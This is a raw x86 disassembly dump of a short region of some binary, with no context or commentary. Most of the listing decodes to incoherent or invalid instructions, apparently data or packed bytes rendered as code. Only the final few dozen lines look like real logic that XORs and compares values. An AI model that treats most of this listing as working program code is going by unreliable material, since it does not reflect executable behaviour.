  41ff8b:	jnp    0x41ff4a
  41ff8d:	fbstp  TBYTE PTR [edx-0x240fbc5a]
  41ff93:	adc    ah,BYTE PTR [ebx]
  41ff95:	fisubr WORD PTR [eax+0x1c893bb2]
  41ff9b:	jp     0x41ff22
  41ff9d:	fisttp WORD PTR [ebp-0x2f]
  41ffa0:	popa   
  41ffa1:	push   ecx
  41ffa2:	ret    0xb90b
  41ffa5:	inc    esi
  41ffa6:	dec    esp
  41ffa7:	adc    edx,DWORD PTR [ebp+eiz*1-0x799f1b13]
  41ffae:	and    edi,DWORD PTR [ebx-0x591a20d6]
  41ffb4:	sub    BYTE PTR [ebp+eiz*4-0x47],bh
  41ffb8:	popa   
  41ffb9:	xor    al,0xe2
  41ffbb:	xchg   ebx,eax
  41ffbc:	adc    eax,0x936b831
  41ffc1:	loopne 0x41ff8b
  41ffc3:	mov    ds:0x15eec930,al
  41ffc8:	add    DWORD PTR [ecx],esi
  41ffca:	les    edx,FWORD PTR [esi+esi*1-0x32]
  41ffce:	das    
  41ffcf:	jp     0x41fff8
  41ffd1:	lahf   
  41ffd2:	in     eax,0xa4
  41ffd4:	add    BYTE PTR [ecx-0x17],dh
  41ffd7:	repz xchg ebp,eax
  41ffd9:	cmp    al,0xe9
  41ffdb:	or     DWORD PTR [esi+0x45b5c95f],ebp
  41ffe1:	cld    
  41ffe2:	pop    esp
  41ffe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffe4:	ins    BYTE PTR es:[edi],dx
  41ffe5:	push   esi
  41ffe6:	scas   eax,DWORD PTR es:[edi]
  41ffe7:	inc    eax
  41ffe8:	dec    eax
  41ffe9:	(bad)  
  41ffea:	and    BYTE PTR [ecx],bl
  41ffec:	fs xchg edi,eax
  41ffee:	cmc    
  41ffef:	mov    ds:0x7b1b82be,al
  41fff4:	mov    bl,0x6c
  41fff6:	inc    eax
  41fff7:	(bad)  
  41fff8:	pusha  
  41fff9:	xchg   ebp,eax
  41fffa:	and    eax,0x60144977
  41ffff:	adc    al,0xa0
  420001:	push   edi
  420002:	ss in  eax,dx
  420004:	out    dx,eax
  420005:	sub    BYTE PTR [esi+eiz*4-0x13],bh
  420009:	jmp    0x872a:0xe2f4b9a
  420010:	fdiv   QWORD PTR [edx-0x71c9b482]
  420016:	xor    al,0x53
  420018:	test   BYTE PTR [ebp-0x46],bl
  42001b:	repnz pop es
  42001d:	lds    esi,FWORD PTR [esi]
  42001f:	ja     0x420009
  420021:	call   0x74d8:0x8cf1e921
  420028:	sbb    esp,ebp
  42002a:	daa    
  42002b:	push   esi
  42002c:	out    0xf3,eax
  42002e:	icebp  
  42002f:	repnz mov cl,BYTE PTR [esi]
  420032:	stos   BYTE PTR es:[edi],al
  420033:	adc    ebx,DWORD PTR [edx+0x6f]
  420036:	inc    edi
  420037:	dec    esi
  420038:	inc    esp
  420039:	aas    
  42003a:	push   es
  42003b:	xor    eax,0x82cbd957
  420040:	dec    ebp
  420041:	pop    edi
  420042:	stc    
  420043:	into   
  420044:	out    0x5,al
  420046:	shl    WORD PTR [edx],0x9a
  42004a:	push   0xffffff95
  42004c:	cld    
  42004d:	sub    BYTE PTR [esi-0xd],dl
  420050:	jns    0x41fff9
  420052:	xchg   BYTE PTR [edi+0x243169fb],dh
  420058:	aam    0x64
  42005a:	push   edx
  42005b:	ss aad 0xcd
  42005e:	jne    0x41fff1
  420060:	jnp    0x4200a6
  420062:	stc    
  420063:	xor    DWORD PTR [edi-0x7e0c1d58],ecx
  420069:	fs icebp 
  42006b:	xor    bl,ah
  42006d:	xchg   edx,eax
  42006e:	dec    ecx
  42006f:	xor    esi,DWORD PTR [esi]
  420071:	xchg   ebp,eax
  420072:	popa   
  420073:	fisub  DWORD PTR ds:0xb93390ec
  420079:	iret   
  42007a:	cli    
  42007b:	mov    ch,0xd5
  42007d:	inc    ebp
  42007e:	sub    dh,BYTE PTR [eax+0x50435850]
  420084:	imul   ecx,DWORD PTR [eax-0x619fba9e],0x5413b305
  42008e:	ja     0x42005f
  420090:	fwait
  420091:	xchg   esi,eax
  420092:	clc    
  420093:	jl     0x420058
  420095:	stos   BYTE PTR es:[edi],al
  420096:	je     0x42010a
  420098:	sbb    al,0x29
  42009a:	cli    
  42009b:	(bad)  
  42009c:	lahf   
  42009d:	adc    BYTE PTR [ebx-0x66],0xe1
  4200a1:	xchg   ecx,eax
  4200a2:	icebp  
  4200a3:	add    ebp,DWORD PTR [edi]
  4200a5:	xchg   esp,eax
  4200a6:	pop    ds
  4200a7:	addr16 mov ds:0x9573,al
  4200ab:	pop    esp
  4200ac:	and    edx,edi
  4200ae:	into   
  4200af:	sbb    DWORD PTR [esi+edi*4],edx
  4200b2:	mov    ch,0x8f
  4200b4:	mov    esi,0x6fd5aae6
  4200b9:	dec    edx
  4200ba:	sub    ah,dl
  4200bc:	fs cmp eax,0xd2613b8b
  4200c2:	xchg   DWORD PTR [edx],edx
  4200c4:	dec    eax
  4200c5:	in     eax,0xa6
  4200c7:	jmp    0xe4f24cca
  4200cc:	or     al,0x3e
  4200ce:	and    al,0x45
  4200d0:	cwde   
  4200d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d2:	cmp    BYTE PTR [esi-0x3],ch
  4200d5:	inc    esi
  4200d6:	pop    ebp
  4200d7:	mov    edi,0x218e67a6
  4200dc:	je     0x4200a3
  4200de:	lea    esi,[ebp-0x18]
  4200e1:	imul   ecx,ebx,0x4b
  4200e4:	popf   
  4200e5:	cmc    
  4200e6:	(bad)  
  4200e7:	sar    BYTE PTR [ecx],0xeb
  4200ea:	mov    ch,0xab
  4200ec:	jge    0x4200d5
  4200ee:	vpaddw xmm3,xmm1,XMMWORD PTR [ecx]
  4200f2:	pop    eax
  4200f3:	bound  eax,QWORD PTR [edx]
  4200f5:	daa    
  4200f6:	lods   al,BYTE PTR ds:[esi]
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	jno    0x420122
  4200fa:	adc    esp,eax
  4200fc:	dec    edx
  4200fd:	push   ecx
  4200fe:	xchg   DWORD PTR [edi+0x66],ebx
  420101:	rcr    DWORD PTR [eax-0x2f386ecd],0x40
  420108:	push   esp
  420109:	jmp    0x1beaab5b
  42010e:	loop   0x4200e7
  420110:	sub    esi,DWORD PTR ds:0xb8a23e7c
  420116:	mov    eax,0x6d8df2d4
  42011b:	in     eax,dx
  42011c:	cmp    BYTE PTR [ecx+0x1f],bl
  42011f:	mov    eax,0xb845bda6
  420124:	push   0x50
  420126:	mov    WORD PTR [ebp+0x79a37896],gs
  42012c:	adc    al,0x5e
  42012e:	frstor [edi]
  420130:	dec    ecx
  420131:	xlat   BYTE PTR ds:[ebx]
  420132:	inc    edi
  420133:	push   ecx
  420134:	test   eax,0x82f96c04
  420139:	imul   esi,DWORD PTR [ebx],0x2a26085a
  42013f:	aad    0x66
  420141:	mov    WORD PTR [edx-0x5e],gs
  420144:	rol    DWORD PTR [ecx+0x40a24806],cl
  42014a:	stc    
  42014b:	inc    ebp
  42014c:	jb     0x420107
  42014e:	add    al,0x2c
  420150:	jnp    0x42018b
  420152:	push   esp
  420153:	gs adc ebp,edx
  420156:	fistp  QWORD PTR [ebx-0x5c]
  420159:	mov    cl,0xb6
  42015b:	mov    ecx,0x2c4b1cf8
  420160:	xchg   esp,eax
  420161:	iret   
  420162:	mov    ah,0x31
  420164:	sub    ch,BYTE PTR [eax+0x5deca213]
  42016a:	or     BYTE PTR [ecx],0x74
  42016d:	bound  ebx,QWORD PTR [eax-0x4e495f4]
  420173:	int3   
  420174:	mov    es,WORD PTR [esi+eiz*2-0x8]
  420178:	mov    dh,0xfe
  42017a:	dec    esi
  42017b:	cmc    
  42017c:	sbb    DWORD PTR [edx],esp
  42017e:	je     0x420108
  420180:	popa   
  420181:	jle    0x4201ec
  420183:	cmp    DWORD PTR [esp+edx*2+0x74],ecx
  420187:	daa    
  420188:	cmc    
  420189:	and    al,BYTE PTR [edx+ecx*1]
  42018c:	hlt    
  42018d:	(bad)  
  42018e:	mov    fs,WORD PTR [eax+0x70]
  420191:	jb     0x420162
  420193:	sbb    eax,DWORD PTR ds:0xc108b1eb
  420199:	js     0x42016c
  42019b:	jmp    0x6f1439c3
  4201a0:	mov    esp,0xb79e0acd
  4201a5:	xor    dl,BYTE PTR [edx-0x75]
  4201a8:	stc    
  4201a9:	(bad)  
  4201aa:	clc    
  4201ab:	inc    ebp
  4201ac:	ror    ebx,0xac
  4201af:	xchg   esi,eax
  4201b0:	icebp  
  4201b1:	mov    esp,0x759bb7a1
  4201b6:	out    0xcc,eax
  4201b8:	test   DWORD PTR [ebx-0x37a62f3b],ecx
  4201be:	leave  
  4201bf:	repz into 
  4201c1:	mov    WORD PTR ds:0x930e54e,cs
  4201c7:	sti    
  4201c8:	cmp    ebx,ecx
  4201ca:	mov    ebx,0x7494f975
  4201cf:	inc    edx
  4201d0:	(bad)  
  4201d1:	in     eax,dx
  4201d2:	jae    0x420200
  4201d4:	mov    BYTE PTR [esi-0x5b],0x2f
  4201d8:	pop    edi
  4201d9:	test   BYTE PTR [ecx+0x6bce9d19],dh
  4201df:	xchg   ebp,eax
  4201e0:	mov    cl,0xdd
  4201e2:	pop    ebp
  4201e3:	mov    dh,0xc6
  4201e5:	mov    al,ds:0xeded275f
  4201ea:	pop    esp
  4201eb:	lds    ebx,FWORD PTR [esi]
  4201ed:	jnp    0x4201a1
  4201ef:	hlt    
  4201f0:	fstp   TBYTE PTR [ebx]
  4201f2:	push   esp
  4201f3:	pop    es
  4201f4:	or     ebx,DWORD PTR [edi+0x46]
  4201f7:	jg     0x4201b0
  4201f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201fa:	retf   
  4201fb:	sub    dh,BYTE PTR [ebp-0x2e232830]
  420201:	call   0xb52b07dc
  420206:	jno    0x420221
  420208:	es or  eax,0x592561a4
  42020e:	sbb    dh,BYTE PTR [eax-0x29]
  420211:	loope  0x42028f
  420213:	mov    al,0xa6
  420215:	sub    al,0x97
  420217:	pop    edi
  420218:	mov    bl,BYTE PTR [ebx]
  42021a:	leave  
  42021b:	mov    bl,0x39
  42021d:	ret    
  42021e:	mov    WORD PTR [edx+0x6],ss
  420221:	jecxz  0x42029a
  420223:	push   0x29
  420225:	add    esi,DWORD PTR [ebx]
  420227:	adc    eax,0xf38e0f45
  42022c:	push   ss
  42022d:	add    bl,dh
  42022f:	or     bh,BYTE PTR [esi-0x360803a4]
  420235:	(bad)  
  420237:	das    
  420238:	adc    ebp,ecx
  42023a:	jb     0x420222
  42023c:	in     al,0xd0
  42023e:	cld    
  42023f:	jb     0x420219
  420241:	shr    DWORD PTR ds:0x1cce34c9,1
  420247:	and    dl,BYTE PTR [ebp+0x1e662b04]
  42024d:	push   eax
  42024e:	aad    0xb5
  420250:	arpl   WORD PTR [ebx-0x5a],si
  420253:	mov    ds:0xcbf4b9ef,eax
  420258:	arpl   WORD PTR [eax],sp
  42025a:	jle    0x42024f
  42025c:	scas   eax,DWORD PTR es:[edi]
  42025d:	nop
  42025e:	mov    ds:0x30ba9408,al
  420263:	loop   0x420242
  420265:	fs jmp 0xfbe090c7
  42026b:	mov    eax,ds:0xfe3c9e80
  420270:	test   DWORD PTR [esp+edx*2-0x7a],ebp
  420274:	add    DWORD PTR [edi+0x5d],esi
  420277:	inc    esi
  420278:	adc    BYTE PTR [eax+0x6d8829ba],0x5
  42027f:	xchg   ebx,eax
  420280:	ja     0x4202d2
  420282:	jge    0x420261
  420284:	push   cs
  420285:	and    BYTE PTR ds:0x5a742270,dh
  42028b:	pop    ss
  42028c:	in     al,0xf6
  42028e:	ds jl  0x4202d8
  420291:	aam    0xd7
  420293:	pop    ebp
  420294:	retf   
  420295:	and    eax,0xb2207c24
  42029a:	xchg   ebx,eax
  42029b:	add    DWORD PTR [esi+0x14729f4f],edx
  4202a1:	test   al,0xe2
  4202a3:	jno    0x420302
  4202a5:	shr    ecx,1
  4202a7:	pop    esi
  4202a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202a9:	push   eax
  4202aa:	repnz daa 
  4202ac:	xchg   dx,ax
  4202ae:	dec    esp
  4202af:	call   0x1631994c
  4202b4:	dec    edi
  4202b5:	ret    0xb7b
  4202b8:	mov    edx,0xa7cc86e8
  4202bd:	and    bh,BYTE PTR [ecx+edx*4]
  4202c0:	popf   
  4202c1:	fs cli 
  4202c3:	add    al,0xd9
  4202c5:	inc    esp
  4202c6:	rcl    BYTE PTR [edi+0x42289c32],0x54
  4202cd:	out    0xbd,al
  4202cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202d0:	stc    
  4202d1:	js     0x4202f7
  4202d3:	(bad)  
  4202d4:	leave  
  4202d5:	dec    eax
  4202d6:	jne    0x4202aa
  4202d8:	sub    edx,DWORD PTR [edx-0x7aa44652]
  4202de:	ret    
  4202df:	push   ebx
  4202e0:	adc    BYTE PTR [esp+eax*8+0x55],ch
  4202e4:	or     BYTE PTR [eax-0x2b9ea02a],dl
  4202ea:	ror    DWORD PTR [ecx-0x3a3708ed],1
  4202f0:	lea    eax,[ebp+0x4e2e6a34]
  4202f6:	xchg   ebp,eax
  4202f7:	inc    esp
  4202f8:	hlt    
  4202f9:	jne    0x4202d0
  4202fb:	addr16 pop esi
  4202fd:	jmp    0x62ffa432
  420302:	jo     0x4202b3
  420304:	in     eax,0xc3
  420306:	jle    0x420364
  420308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420309:	and    esi,DWORD PTR [esi+edx*8+0x51]
  42030d:	xchg   edi,eax
  42030e:	mov    eax,ds:0xc53d558
  420313:	out    dx,eax
  420314:	repnz cwde 
  420316:	aam    0x66
  420318:	mov    bl,0x23
  42031a:	mov    dh,BYTE PTR [eax]
  42031c:	js     0x4202ba
  42031e:	cmp    esp,edx
  420320:	mov    eax,ds:0x1949231e
  420325:	sbb    DWORD PTR [edx+0x76],0x92fa7ff4
  42032c:	mov    al,ds:0x5a5c1a30
  420331:	mov    cl,0xa4
  420333:	xor    DWORD PTR [edx-0x65],ebx
  420336:	out    dx,eax
  420337:	jle    0x4202df
  420339:	pop    ecx
  42033a:	jae    0x420392
  42033c:	(bad)  
  42033e:	or     eax,0xb4c080f8
  420343:	sub    eax,0x8dc8b7d7
  420348:	fucom  st(0)
  42034a:	sbb    al,0x9e
  42034c:	mov    edx,0x7c84b4a9
  420351:	leave  
  420352:	push   ebp
  420353:	data16 aaa 
  420355:	mov    edx,0x862714b6
  42035a:	push   ds
  42035b:	push   es
  42035c:	js     0x4202ed
  42035e:	std    
  42035f:	or     al,0x6c
  420361:	push   ebp
  420362:	or     BYTE PTR [eax],0xa2
  420365:	inc    edx
  420366:	les    edx,FWORD PTR [edx+0x39]
  420369:	and    ebx,esi
  42036b:	push   ecx
  42036c:	mov    eax,0x9d75117b
  420371:	jge    0x4203af
  420373:	call   0x124d:0xf6b4d360
  42037a:	adc    al,0x6f
  42037c:	arpl   ax,cx
  42037e:	jl     0x420312
  420380:	jno    0x42035d
  420382:	mov    dl,dh
  420384:	fs jo  0x420307
  420387:	stc    
  420388:	rcr    BYTE PTR [eax],1
  42038a:	daa    
  42038b:	mov    edx,0x16f97d6f
  420390:	mov    BYTE PTR fs:0xffc15b17,bl
  420397:	and    DWORD PTR [edx],eax
  420399:	mov    dh,0xff
  42039b:	jb     0x42040d
  42039d:	(bad)  
  42039e:	cmp    al,0xf2
  4203a0:	std    
  4203a1:	clc    
  4203a2:	dec    eax
  4203a3:	xor    eax,0x9a88141b
  4203a8:	mov    WORD PTR [edi-0x41],?
  4203ab:	aaa    
  4203ac:	adc    ecx,edi
  4203ae:	jge    0x4203ca
  4203b0:	pop    esi
  4203b1:	pop    esp
  4203b2:	nop
  4203b3:	add    al,ah
  4203b5:	mov    dh,BYTE PTR [edi-0x4e31653b]
  4203bb:	repz fnstcw WORD PTR [edi]
  4203be:	mov    dl,0x71
  4203c0:	nop
  4203c1:	adc    ebx,DWORD PTR [ebx-0x43]
  4203c4:	mov    bh,0x61
  4203c6:	inc    edi
  4203c7:	jnp    0x4203d4
  4203c9:	pop    ecx
  4203ca:	jbe    0x42040f
  4203cc:	mov    edx,0x1eec1e53
  4203d1:	stos   BYTE PTR es:[edi],al
  4203d2:	push   DWORD PTR [edi-0x79]
  4203d5:	dec    esp
  4203d6:	sub    al,BYTE PTR [ecx]
  4203d8:	pop    edx
  4203d9:	mov    esp,0x368328c5
  4203de:	iret   
  4203df:	jae    0x420436
  4203e1:	xor    ah,0xdc
  4203e4:	jecxz  0x420429
  4203e6:	stos   BYTE PTR es:[edi],al
  4203e7:	bound  ecx,QWORD PTR [ebp+edi*2+0x78bb965]
  4203ee:	push   esp
  4203ef:	int3   
  4203f0:	jnp    0x4203d9
  4203f2:	stos   DWORD PTR es:[edi],eax
  4203f3:	adc    DWORD PTR [eax-0xa],esp
  4203f6:	not    ch
  4203f8:	not    dl
  4203fa:	mov    ah,BYTE PTR [edx]
  4203fc:	cmp    al,0x98
  4203fe:	int    0x5d
  420400:	cwde   
  420401:	pop    ss
  420402:	xlat   BYTE PTR ds:[ebx]
  420403:	dec    edi
  420404:	and    esp,esi
  420406:	shl    ebx,0x8d
  420409:	(bad)  
  42040b:	in     eax,dx
  42040c:	fcom   DWORD PTR [esi]
  42040e:	mov    cl,BYTE PTR [ebx+0x339fd7f4]
  420414:	dec    edx
  420415:	mov    eax,ds:0x30803894
  42041a:	lods   al,BYTE PTR ds:[esi]
  42041b:	jb     0x420400
  42041d:	lock or al,0xa7
  420420:	xor    eax,esp
  420422:	or     eax,0xf13fab8b
  420427:	lahf   
  420428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420429:	fst    QWORD PTR [esi]
  42042b:	mov    al,ds:0xa16d96b8
  420430:	inc    ebx
  420431:	or     dh,BYTE PTR [ecx]
  420433:	jp     0x420417
  420435:	jae    0x4203dd
  420437:	and    BYTE PTR [eax],dh
  420439:	int3   
  42043a:	sub    esi,DWORD PTR [esi]
  42043c:	push   eax
  42043d:	adc    dl,BYTE PTR [edi-0x52a2a8da]
  420443:	sbb    al,0x7b
  420445:	cmp    bl,ah
  420447:	sub    cl,al
  420449:	mov    ah,0xb4
  42044b:	addr16 sbb ah,0xbd
  42044f:	or     eax,0x2830cef9
  420454:	dec    ecx
  420455:	scas   al,BYTE PTR es:[edi]
  420456:	sbb    ebx,DWORD PTR [esi+0x73aedb0a]
  42045c:	pop    es
  42045d:	fisub  DWORD PTR [esi+0x6c]
  420460:	pmaddwd mm5,QWORD PTR ds:0xf5de8cd2
  420467:	rcl    DWORD PTR [edi+0x5d],1
  42046a:	cmp    eax,0x3945db1f
  42046f:	sahf   
  420470:	rcl    esp,cl
  420472:	add    eax,0xd9d66d66
  420477:	mov    al,0x8a
  420479:	sbb    eax,0xe3afa89e
  42047e:	frstor [esi-0x3e]
  420481:	stc    
  420482:	pushf  
  420483:	mov    cl,0xd2
  420485:	test   eax,0xbfa3b7ca
  42048a:	pop    esp
  42048b:	inc    edi
  42048c:	lods   al,BYTE PTR ds:[esi]
  42048d:	outs   dx,DWORD PTR ds:[esi]
  42048e:	mov    DWORD PTR ds:0x79382146,0x43d21a75
  420498:	scas   eax,DWORD PTR es:[edi]
  420499:	xchg   esp,eax
  42049a:	into   
  42049b:	push   edi
  42049c:	lods   al,BYTE PTR ds:[esi]
  42049d:	fsubr  QWORD PTR [ebx-0x31]
  4204a0:	out    dx,eax
  4204a1:	sub    BYTE PTR [edi],dl
  4204a3:	pop    eax
  4204a4:	test   BYTE PTR [eax+0x28bb2f3c],al
  4204aa:	in     eax,0xe3
  4204ac:	mov    eax,0x371db756
  4204b1:	and    al,dl
  4204b3:	xchg   ecx,eax
  4204b4:	scas   eax,DWORD PTR es:[edi]
  4204b5:	outs   dx,BYTE PTR ds:[esi]
  4204b6:	jge    0x420522
  4204b8:	(bad)  
  4204b9:	mov    eax,ds:0xa9b58b03
  4204be:	push   eax
  4204bf:	inc    ecx
  4204c0:	lahf   
  4204c1:	jmp    0x5b617e4
  4204c6:	xchg   ebp,eax
  4204c7:	push   ebx
  4204c8:	or     esp,DWORD PTR [edx+0x48]
  4204cb:	pop    edi
  4204cc:	pop    ebp
  4204cd:	je     0x420468
  4204cf:	outs   dx,DWORD PTR ds:[esi]
  4204d0:	outs   dx,BYTE PTR ds:[esi]
  4204d1:	adc    eax,0x769d415c
  4204d6:	or     eax,0x931a867a
  4204db:	ret    0xbb82
  4204de:	and    al,0xf0
  4204e0:	adc    BYTE PTR [ebp+0x6aba8d82],bl
  4204e6:	clc    
  4204e7:	dec    eax
  4204e8:	shl    DWORD PTR [edi],1
  4204ea:	adc    BYTE PTR [ebx],dl
  4204ec:	xor    ecx,ecx
  4204ee:	outs   dx,DWORD PTR ds:[esi]
  4204ef:	cmc    
  4204f0:	inc    esi
  4204f1:	mov    BYTE PTR [ebx],ch
  4204f3:	fwait
  4204f4:	push   esi
  4204f5:	jno    0x420511
  4204f7:	data16 ins BYTE PTR es:[edi],dx
  4204f9:	jg     0x4204f4
  4204fb:	mov    ds:0x30ae5fbb,al
  420500:	(bad)  
  420501:	out    dx,eax
  420502:	fidiv  DWORD PTR [ebx]
  420504:	aad    0xb7
  420506:	sbb    al,0x8e
  420508:	cmp    al,0x80
  42050a:	jb     0x420502
  42050c:	mov    WORD PTR [edx-0x5e9212ca],es
  420512:	add    DWORD PTR [ecx+0x46],edi
  420515:	mov    eax,ds:0x4174ea17
  42051a:	and    esi,DWORD PTR [eax+0x37]
  42051d:	ds xchg edi,eax
  42051f:	sub    al,0xf2
  420521:	cmc    
  420522:	into   
  420523:	ss jecxz 0x4204dd
  420526:	aas    
  420527:	jbe    0x42056a
  420529:	repz sbb DWORD PTR [edx],ebx
  42052c:	hlt    
  42052d:	test   eax,0x106792a0
  420532:	in     eax,0x28
  420534:	push   es
  420535:	es mov esp,eax
  420538:	dec    esp
  420539:	loope  0x420529
  42053b:	ins    DWORD PTR es:[edi],dx
  42053c:	xor    ch,BYTE PTR [edx]
  42053e:	inc    edi
  42053f:	(bad)  
  420541:	lods   al,BYTE PTR ds:[esi]
  420542:	mov    ecx,0x1456367a
  420547:	push   eax
  420548:	scas   al,BYTE PTR es:[edi]
  420549:	(bad)  
  42054b:	lahf   
  42054c:	shl    DWORD PTR [edi],1
  42054e:	add    ah,BYTE PTR [esi-0x36]
  420551:	in     al,dx
  420552:	ja     0x4205be
  420554:	ds mov ecx,0xa6e4e4d3
  42055a:	ins    DWORD PTR es:[edi],dx
  42055b:	mov    esi,0x8113f74
  420560:	inc    ah
  420562:	imul   esp,esi,0xd0320159
  420568:	sbb    eax,0x64250d82
  42056d:	js     0x420525
  42056f:	retf   0x482
  420572:	and    BYTE PTR [eax+0x5e],al
  420575:	fild   QWORD PTR [ebp+0x26]
  420578:	cmp    DWORD PTR [ebx-0x4d],edi
  42057b:	pslld  mm2,mm1
  42057e:	dec    ebp
  42057f:	out    dx,eax
  420580:	inc    eax
  420581:	add    DWORD PTR [edx-0x35757e4e],edi
  420587:	jle    0x420533
  420589:	xchg   esi,eax
  42058a:	or     ah,0x66
  42058d:	test   eax,0xdf03506e
  420592:	mov    edi,0x942faf47
  420597:	mov    edx,0xef6e40b1
  42059c:	arpl   WORD PTR [edx],cx
  42059e:	or     DWORD PTR [eax+0x7f],ecx
  4205a1:	sahf   
  4205a2:	mov    ch,bl
  4205a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205a5:	nop
  4205a6:	mov    ch,0x9c
  4205a8:	xchg   BYTE PTR [ebx-0x71],ah
  4205ab:	dec    ebp
  4205ac:	not    BYTE PTR [ebp-0x80]
  4205af:	cmp    al,0x98
  4205b1:	inc    ebp
  4205b2:	sub    BYTE PTR [esi-0x26],dl
  4205b5:	imul   ecx,DWORD PTR [eax+0x53],0xffffffaa
  4205b9:	icebp  
  4205ba:	jne    0x420631
  4205bc:	mov    edx,0x259e472f
  4205c1:	call   0xf7bb:0xc5a266ec
  4205c8:	imul   esi,ebx,0xffffffc3
  4205cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205cc:	dec    ebx
  4205cd:	xchg   ebp,eax
  4205ce:	pop    ss
  4205cf:	sub    ebp,DWORD PTR [edx-0x57]
  4205d2:	(bad)  
  4205d3:	jl     0x420610
  4205d5:	and    al,0xe
  4205d7:	shl    DWORD PTR [ebx+0x6c144ae0],cl
  4205dd:	mov    ds:0xaac4fd59,al
  4205e2:	sahf   
  4205e3:	rcl    BYTE PTR [esi+edi*4],0x1d
  4205e7:	xchg   esi,eax
  4205e8:	mov    ebx,0xde904b1d
  4205ed:	aam    0xfa
  4205ef:	push   esi
  4205f0:	pinsrw mm3,WORD PTR [ebp-0x372c7f32],0xd8
  4205f8:	shl    BYTE PTR [edx-0x7d],1
  4205fb:	and    DWORD PTR [edx+0x128ef275],esp
  420601:	call   0x7f25:0x468f5d9f
  420608:	shl    DWORD PTR [ebx+ebp*2-0x54],0x52
  42060d:	in     eax,dx
  42060e:	dec    ebp
  42060f:	test   al,0x7f
  420611:	enter  0x6de0,0x9d
  420615:	cli    
  420616:	leave  
  420617:	jl     0x420637
  420619:	mov    ecx,0x61a2edf2
  42061e:	jp     0x42069d
  420620:	cmp    bh,al
  420622:	adc    DWORD PTR [ebx-0x65f6746b],esi
  420628:	push   ebx
  420629:	in     eax,dx
  42062a:	addr16 pop ds
  42062c:	mov    ch,0xf9
  42062e:	jle    0x42066a
  420630:	xor    al,0xf8
  420632:	pop    ds
  420633:	pusha  
  420634:	jmp    0xd15eadd2
  420639:	js     0x4206a1
  42063b:	xchg   ebp,eax
  42063c:	sub    al,0x37
  42063e:	out    dx,al
  42063f:	jmp    0x89c6f79c
  420644:	in     eax,0x1b
  420646:	imul   ebx,DWORD PTR [esp+eiz*8+0x7f],0x3d45bfa1
  42064e:	or     eax,0xb05db774
  420653:	adc    BYTE PTR [edx+0x13813103],0xb8
  42065a:	cdq    
  42065b:	xor    DWORD PTR [esi],ebx
  42065d:	cmp    al,0xaa
  42065f:	and    edi,ecx
  420661:	scas   eax,DWORD PTR es:[edi]
  420662:	ret    0xa86
  420665:	sbb    ebx,DWORD PTR [eax-0x37]
  420668:	add    al,0x94
  42066a:	and    BYTE PTR [ecx+0x69],0x96
  42066e:	cmp    dh,bh
  420670:	xor    al,0xa7
  420672:	cmp    al,0x71
  420674:	test   BYTE PTR [eax],ch
  420676:	mov    bh,BYTE PTR [esi-0x7b342a3e]
  42067c:	cmp    BYTE PTR [eax+0x1b2c7fec],ah
  420682:	mov    eax,0xc773b456
  420687:	push   esi
  420688:	(bad)  [ebx+0x4b711279]
  42068e:	xor    BYTE PTR [ebx],cl
  420690:	sbb    BYTE PTR [ecx],ch
  420692:	sub    dh,al
  420694:	add    BYTE PTR [ebx+edx*2-0x70013c26],al
  42069b:	popf   
  42069c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42069d:	pop    es
  42069e:	push   ebp
  42069f:	fisttp DWORD PTR [eax]
  4206a1:	jae    0x42071e
  4206a3:	inc    ebx
  4206a4:	lds    edi,FWORD PTR [ecx]
  4206a6:	sub    DWORD PTR [esi+0x2a],ecx
  4206a9:	jp     0x4206bc
  4206ab:	call   0xd1d1:0xeb976387
  4206b2:	loopne 0x4206c7
  4206b4:	cld    
  4206b5:	mov    BYTE PTR [edi+0x5d],dl
  4206b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ba:	xchg   esp,eax
  4206bb:	hlt    
  4206bc:	cwde   
  4206bd:	js     0x4206d1
  4206bf:	inc    edi
  4206c0:	sahf   
  4206c1:	nop
  4206c2:	jne    0x4206af
  4206c4:	shl    dh,0xb2
  4206c7:	sar    DWORD PTR [ebx+edi*8],cl
  4206ca:	ret    0x1100
  4206cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206ce:	(bad)  
  4206cf:	mov    ch,0xb1
  4206d1:	(bad)  
  4206d3:	in     eax,dx
  4206d4:	pop    ecx
  4206d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206d6:	pop    ecx
  4206d7:	mov    edi,0x398c4c6c
  4206dc:	iret   
  4206dd:	add    al,0x29
  4206df:	(bad)  
  4206e1:	adc    ecx,DWORD PTR [edx]
  4206e3:	push   0xffffff99
  4206e5:	xor    BYTE PTR [bx+si],ch
  4206e8:	dec    eax
  4206ea:	cmc    
  4206eb:	mov    DWORD PTR [ebp-0x1c],edi
  4206ee:	mov    edi,DWORD PTR [ebp+0x8]
  4206f1:	xor    edi,ecx
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
